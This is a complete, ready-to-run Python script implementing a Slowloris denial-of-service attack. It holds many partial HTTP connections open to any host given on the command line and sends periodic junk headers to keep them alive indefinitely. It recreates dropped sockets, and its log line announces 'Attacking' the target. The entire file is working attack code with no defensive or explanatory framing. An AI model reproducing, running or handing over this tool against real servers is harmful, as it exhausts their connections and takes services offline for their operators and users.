import socket
import logging
import argparse

from sys import exit, stdout
from time import sleep
from random import randint
from queue import Queue
from threading import Thread

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

handler = logging.StreamHandler(stdout)
handler.setLevel(logging.INFO)

logger.addHandler(handler)


class Worker(Thread):
    """Thread executing tasks from a given tasks queue"""
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()


class ThreadPool:
    """Pool of threads consuming tasks from a queue"""
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """Add a task to the queue"""
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        """Wait for completion of all the tasks in the queue"""
        self.tasks.join()


class SlowLoris:
    headers = [
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
        'Accept-Language: en-US,en;q=0.5'
    ]

    def __init__(self, target, sock_count, thread_count=1):
        self.sockets = []
        self._workers = []
        self._sock_count = sock_count
        self.target = target
        self.pool = ThreadPool(thread_count)

    def connect_sockets(self):
        for _ in range(self._sock_count):
            self.pool.add_task(self.init_socket)
        self.pool.wait_completion()

    def init_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect(self.target)

            sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
            for header in self.headers:
                sock.send('{}\r\n'.format(header).encode('utf-8'))
            logger.debug('Connection established for {} on port {}'.format(self.target[0], self.target[1]))
            if sock:
                self.sockets.append(sock)
        except socket.error:
            logger.info('Losing connection at {} sockets'.format(len(self.sockets)))
            return

    def __enter__(self):
        return self

    def __exit__(self, *args):
        for sock in self.sockets:
            sock.close()

    def keep_alive(self):
        for sock in self.sockets:
            try:
                sock.send('X-a: {}\r\n'.format(randint(1, 50000)).encode('utf-8'))
            except socket.error:
                self.sockets.remove(sock)
        for _ in range(self._sock_count - len(self.sockets)):
            logger.info('Recreating socket...')
            self.pool.add_task(self.init_socket)
        self.pool.wait_completion()
        sleep(15)


def main():
    # Parsing the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('--sock_count', default=200, type=int)
    parser.add_argument('--thread_count', default=5, type=int)
    parser.add_argument('--port', default=80, type=int)
    args = parser.parse_args()

    logger.info('Attacking {} with {} sockets'.format(args.host, args.sock_count))

    # Initialize the SlowLoris object
    logger.info('Creating a thread pool of {} threads'.format(args.thread_count))
    with SlowLoris((args.host, args.port), args.sock_count, args.thread_count) as slowloris:

        logger.info('Creating {} sockets'.format(args.sock_count))
        slowloris.connect_sockets()

        while True:
            slowloris.keep_alive()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info('Interrupt received, shutting down...')
